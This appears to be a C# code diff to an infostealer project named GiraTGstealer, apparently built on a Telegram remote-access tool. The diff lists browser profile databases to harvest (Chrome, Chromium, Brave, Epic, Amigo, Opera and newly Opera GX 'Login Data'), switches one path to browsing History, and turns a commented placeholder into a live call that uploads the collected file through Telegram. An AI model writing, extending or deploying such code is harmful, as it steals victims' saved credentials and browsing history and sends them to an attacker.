@@ -5,7 +5,6 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
-using TelegramRAT;
 
 namespace GiraTGstealer.stealer
 {
@@ -17,7 +16,7 @@ namespace GiraTGstealer.stealer
 
             string ad = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
             string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
-            string ud = "\\User Data\\Default\\Login Data";
+            string ud = "\\User Data\\Default\\History";
 
             string[] chromBrowsers = new string[]
             {
@@ -25,6 +24,7 @@ namespace GiraTGstealer.stealer
                 lad + "Google(x86)\\Chrome" + ud,
                 lad + "Chromium" + ud,
                 ad + "Opera Software\\Opera Stable\\Login Data",
+                ad + "Opera Software\\Opera GX Stable\\Login Data",
                 lad + "BraveSoftware\\Brave-Browser" + ud,
                 lad + "Epic Privacy Browser" + ud,
                 lad + "Amigo" + ud,
@@ -91,7 +91,7 @@ namespace GiraTGstealer.stealer
                 continue;
             }
             File.WriteAllText(filename, output);
-            // Telegram uploadfile
+            telegram.UploadFile(filename, true);
         }
     }
 }
